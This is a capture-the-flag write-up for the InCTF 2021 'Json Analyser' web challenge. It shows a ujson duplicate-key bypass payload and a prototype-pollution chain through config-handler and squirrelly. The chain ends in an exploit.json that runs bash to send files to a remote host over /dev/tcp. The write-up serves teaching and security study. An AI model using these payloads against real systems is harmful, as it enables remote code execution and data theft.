---
title: Json Analyser - InCTF Internationals 2021
date: 2021-08-15
author: 1nt3rc3pt0r
author_url: https://twitter.com/_1nt3rc3pt0r_
categories:
 - Web Exploitation
tags:
 - Prototype_Pollution
 - Json_Interoperability 
 - InCTFi
---

**tl;dr**

+ Json_Interoperability - `/verify_roles?role=supersuperuseruser\ud800","name":"admin`
+ Prototype_Pollution - `{"constructor":{"prototype":{"test":"123"}}}` in config-handler


<!--more-->

<!-- rce can be found [here](exploit.json) -->

**Challenge points:** 1000
**Challenge Author:** [1nt3rc3pt0r](https://twitter.com/_1nt3rc3pt0r_)
**Source Code:** [here](json_analyser.zip)

## Challenge Description

Welcome to JSON Analyser. Verify your role and get Subscription ID. Then start looking into your dump json file.


## Solution

### **Part - I:**

Looking into the source, one can find that the player has to get subscription_code first inorder to upload a Json file.

``` 
    if "superuser" in role:
        role=role.replace("superuser",'')
    if " " in role:
        return "n0 H3ck1ng"
    if len(role)>30:
        return "invalid role"
    data='"name":"user","role":"{0}"'.format(role)
    no_hecking=re.search(r'"role":"(.*?)"',data).group(1)
    if(no_hecking)==None:
        return "bad data :("
    if no_hecking == "superuser":
        return "n0 H3ck1ng"
    data='{'+data+'}'
    try:
        user_data=ujson.loads(data)
    except:
        return "bad format" 
```

The goal is to bypass waf and get subscription_code.

Payload:
 - `/verify_roles?role=supersuperuseruser\ud800","name":"admin` 
 - This happens because of `Character Truncation` while using ujson and `last-key precedence` when duplicate keys exists.   [read_more_about_this](https://labs.bishopfox.com/tech-blog/an-exploration-of-json-interoperability-vulnerabilities)

### **Part - II:**

After retrieving subscription_code, players can now upload their json file providing subscription_code and get it's preview

```
    if(req.body.pin !== "673307-0496-1001122"){
        return res.send('bad pin')
    }
    if (!req.files || Object.keys(req.files).length === 0) {
      return res.status(400).send('No files were uploaded.');
    }
    uploadFile = req.files.uploadFile;
    uploadPath = __dirname + '/package.json' ;
    uploadFile.mv(uploadPath, function(err) {
        if (err)
            return res.status(500).send(err);
        try{
            var config = require('config-handler')();
        }
        catch(e){
            const src = "package1.json";
            const dest = "package.json";
            fs.copyFile(src, dest, (error) => {
                if (error) {
                    console.error(error);
                    return;
                }
                console.log("Copied Successfully!");
            });
            return res.sendFile(__dirname+'/static/error.html')
        }
```

as you can see `package.json` file is replaced with uploaded file and then it's been loaded by `var config = require('config-handler')();`

config-handler is vulnerable to Prototype_Pollution

`poc.json`
```
{
"constructor":{
    "prototype":
        {"test":"works"}
    }
}
```

`poc.js`
```
const express = require('express');
const app = express();
port = 8081

app.get('/', function (req, res) {
    const config = require('config-handler')();
    console.log(test)
    console.log(config)
});
var server= app.listen(port, () => {
    console.log(`Example app listening at http://localhost:${port}`)
});
```


### **Part - III:**

From the Dockerfile it's clear that user needs to get RCE inorder to retrieve flag. Now players need to Leverage the Prototype Pollution in `config-handler` to gain RCE using `squirrelly-js` module.

`exploit.json`
```
{
    "name": {
      "__proto__":{
         "defaultFilter" : "e'));process.mainModule.require('child_process').execSync('/bin/bash -c \\'cat /* > /dev/tcp/<ip>/<port>\\'')//"
      }
     },
    "version": "1.0.0",
    "description": "",
    "main": "app.js",
    "dependencies": {
      "config-handler": "^2.0.3",
      "express": "^4.17.1",
      "express-fileupload": "^1.2.1",
      "nodemon": "^2.0.12",
      "squirrelly": "^8.0.8"
    },
    "devDependencies": {},
    "scripts": {
      "test": "echo \"Error: no test specified\" && exit 1"
    },
    "author": "",
    "license": "ISC"
 }
```
Why defaultFilter? [see_here](https://github.com/squirrellyjs/squirrelly/blob/master/src/compile-string.ts#L128)

## Flag:

inctf{Pr0707yp3_P011u710n5_4r3_D34dly}
